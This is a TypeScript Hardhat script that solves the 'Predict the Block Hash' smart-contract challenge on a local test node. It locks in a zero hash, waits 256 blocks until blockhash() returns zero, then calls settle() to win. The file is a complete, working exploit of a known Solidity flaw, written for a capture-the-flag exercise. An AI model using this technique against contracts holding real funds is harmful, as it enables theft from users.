import 'dotenv/config';
import chalk from 'chalk';
import { ethers } from "hardhat";
import { utils} from 'ethers';

import { PredictTheBlockHashChallenge } from "../typechain"


const MNEMONIC = 'test test test test test test test test test test test junk'
const PATH = "m/44'/60'/0'/0/2"
const provider = new ethers.providers.WebSocketProvider("ws://localhost:8545");

// const wallet = new ethers.Wallet(privateKey)
const wallet =  ethers.Wallet.fromMnemonic(MNEMONIC,PATH );

const attaker = wallet.address;
const account = wallet.connect(provider);
provider.removeAllListeners();

const blocktime = 5;

const predictTheBlockhashChallenge = new ethers.Contract(
  "0x8464135c8F25Da09e49BC8782676a84730C318bC",
  [
    'function isComplete() view returns (bool)',
    'function lockInGuess(bytes32 hash) payable',
    'function settle()'
  ],
  account
);


async function main() {

    console.log('attaker',attaker)
    console.log(chalk.green('locking the number...'));

    const lockInGuessTx = await (predictTheBlockhashChallenge as PredictTheBlockHashChallenge).lockInGuess(
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        { value: utils.parseEther("1"), gasLimit: 1000000 }
    );

    await lockInGuessTx.wait();

    const initialBlockNumber = await provider.getBlockNumber();

    console.log(chalk.yellow('wait for 256 blocks '))


    let lastBlockNumber = initialBlockNumber;

    do {
        try {
          lastBlockNumber = await provider.getBlockNumber();
          console.log(chalk.yellow(`Block number: ${lastBlockNumber}`));
          await new Promise(resolve => setTimeout(resolve, 1000 * blocktime));
        } catch (err) {
          console.log(err);
        }
      } while (lastBlockNumber - initialBlockNumber < 256);
    
    const attackTx = await (predictTheBlockhashChallenge as PredictTheBlockHashChallenge).settle();
    await attackTx.wait();

    let isComplete = await (predictTheBlockhashChallenge as PredictTheBlockHashChallenge).isComplete();

    if (isComplete) console.log(chalk.green(`Challenge solved !!! \n`));


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
